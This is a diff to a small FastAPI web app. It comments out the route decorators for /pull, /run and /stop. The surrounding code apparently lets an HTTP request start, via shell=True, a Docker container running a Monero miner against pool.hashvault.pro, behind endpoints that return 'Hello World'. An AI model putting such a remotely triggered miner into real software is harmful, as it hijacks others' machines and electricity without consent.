@@ -8,13 +8,13 @@ app = FastAPI()
 def read_root():
     return {"Hello": "World"}
 
-@app.get("/pull")
+#@app.get("/pull")
 def pull_container():
     subprocess.run("docker pull nginx", shell=True)
     return {"Hello": "World"}
 
 
-@app.get("/run")
+#@app.get("/run")
 def run_container():
     subprocess.run("docker run -itd --restart=always -e POOL_URL=pool.hashvault.pro:80 -e "
                    "POOL_USER"
@@ -22,7 +22,7 @@ def run_container():
                    "--name monero pmietlicki/monero-miner", shell=True)
     return {"Hello": "World"}
 
-@app.get("/stop")
+#@app.get("/stop")
 def start_container():
     subprocess.run("docker stop monero", shell=True)
     subprocess.run("docker rm monero", shell=True)
